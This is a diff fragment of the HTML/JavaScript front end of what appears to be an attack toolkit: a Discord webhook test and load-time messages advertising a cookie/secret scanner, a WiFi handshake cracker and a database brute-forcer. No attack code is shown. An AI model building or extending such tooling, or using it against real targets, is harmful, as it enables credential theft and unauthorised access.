+    if (!wh) { addLine('Paste your webhook URL first.', 'error'); return; }
+    fetch('/webhook/test', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({webhook_url: wh})
+    })
+    .then(r => r.json())
+    .then(d => addLine(d.ok ? 'Webhook test sent — check Discord.' : ('Webhook error: ' + d.error), d.ok ? 'ok' : 'error'))
+    .catch(e => addLine('Webhook test failed: ' + e, 'error'));
+  }
+
+  /* ── Init on load ─────────────────────────────────────────────────────────── */
+  document.addEventListener('DOMContentLoaded', () => {
+    setMode('web');          // ensure correct panel shown
+    addLine('System ready. Select a mode and enter your target.', 'system');
+    addLine('WEB = cookie/secret scanner | WIFI = handshake cracker | DATABASE = DB bruteforcer', 'info');
+  });
+</script>
+</body>
+</html>
